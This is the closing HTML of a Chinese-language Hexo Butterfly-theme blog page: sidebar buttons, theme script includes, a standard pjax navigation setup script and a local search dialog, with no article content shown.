class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
